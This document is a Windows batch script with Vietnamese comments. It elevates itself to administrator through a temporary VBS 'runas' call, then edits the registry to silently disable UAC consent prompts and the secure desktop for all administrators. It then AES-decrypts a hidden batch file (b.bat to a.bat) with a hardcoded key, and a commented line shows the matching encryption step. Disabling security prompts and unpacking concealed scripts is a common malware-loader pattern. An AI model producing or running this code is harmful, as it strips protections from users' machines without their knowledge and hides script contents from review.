@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f

rem ma hoa a-> b 
rem powershell -Command "$plainText = Get-Content -Path 'C:\a.bat' | Out-String; $key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $aes = [System.Security.Cryptography.AesManaged]::new(); $aes.Key = $key; $aes.IV = $iv; $encryptor = $aes.CreateEncryptor(); $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText); $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length); [System.IO.File]::WriteAllBytes('C:\b.bat', $encryptedBytes)"

rem giai ma b -> a
powershell -Command "$encryptedBytes = [System.IO.File]::ReadAllBytes('C:\b.bat'); $key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $aes = [System.Security.Cryptography.AesManaged]::new(); $aes.Key = $key; $aes.IV = $iv; $decryptor = $aes.CreateDecryptor(); $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length); [System.IO.File]::WriteAllBytes('C:\a.bat', $decryptedBytes)"

pause
